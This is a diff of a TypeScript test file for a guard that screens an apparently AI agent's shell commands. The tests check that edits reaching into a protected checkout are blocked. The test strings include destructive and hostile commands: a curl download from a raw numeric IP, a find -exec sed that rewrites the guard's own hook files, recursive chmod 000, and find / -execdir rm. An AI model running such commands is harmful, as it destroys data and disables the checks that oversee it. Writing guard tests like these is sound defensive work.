@@ -836,3 +836,36 @@ test('cycle 2: a clone with a code-running config key is the floor, in any spell
 test('capInput: a redaction that hides a line break marks the input truncated', () => {
   assert.equal(p.capInput({ command: 'echo -----BEGIN A PRIVATE KEY-----\ncurl -o /tmp/x http://3232235777/x' }).truncated, true)
 })
+
+// The Claude review of PR 17: the live-checkout rule for a session that starts OUTSIDE the checkout and reaches into it by a relative path.
+test('review r1: a relative path into a live checkout is the floor behind a wrapper, git -C, env -C, cd, pushd and find -exec', () => {
+  const o = { home: '/Users/x', roots: ['/tmp/ai-manager'], cwd: '/tmp/clone' }
+  const f = (c: string) => p.floorCheck('Bash', { command: c }, o)
+  for (const c of [
+    'nohup git -C ../ai-manager pull',
+    'time git -C ../ai-manager checkout other',
+    'env -C ../ai-manager git pull',
+    'env -C /tmp/clone git pull',
+    'timeout 60 git -C ../ai-manager commit -am x',
+    'git -C ../ai-manager pull',
+    'pushd ../ai-manager && pushd /tmp && pushd && git checkout other-branch',
+    'pushd /tmp/clone && pushd /tmp && pushd +1 && git checkout other',
+    'pushd -n ../ai-manager && git checkout other',
+    "find ../ai-manager/tools/callboard/mod/hooks -name '*.ts' -exec sed -i 's|floor|x|' {} +",
+    'find ../ai-manager -exec chmod 000 {} +',
+    'find .. -name x -exec chmod 000 {} +',
+    'find /tmp -name x -exec chmod 000 {} +',
+    'find / -name x -execdir rm {} +',
+    'find "$D" -exec chmod 000 {} +',
+    'cp x ../ai-manager/y',
+  ]) assert.notEqual(f(c), undefined, c)
+  // Not a reach into a checkout: the same shapes elsewhere, a read of the clone's own files, a find that stays in the clone.
+  for (const c of ['git -C ../other pull', 'nohup git status', 'pushd ../other && git status', "find . -name '*.ts' -exec grep -l floor {} +", 'find /tmp/clone -name x -exec ls {} +', 'cd /tmp/clone && ls ../other', 'env FOO=1 git status']) assert.equal(f(c), undefined, c)
+})
+test('review r1: pushd with no folder, +N, -N or -n is an unknown folder; cd with no folder is home', () => {
+  const o = { home: '/Users/x', roots: ['/tmp/ai-manager'], cwd: '/tmp/clone' }
+  const f = (c: string) => p.floorCheck('Bash', { command: c }, o)
+  for (const c of ['pushd && touch x', 'pushd +1 && touch x', 'pushd -1 && touch x', 'pushd -n /tmp && touch x', 'popd && touch x']) assert.equal(f(c), 'settings', c)
+  assert.equal(f('cd && touch x'), undefined)
+  assert.equal(f('pushd /tmp/clone/sub && touch x'), undefined)
+})
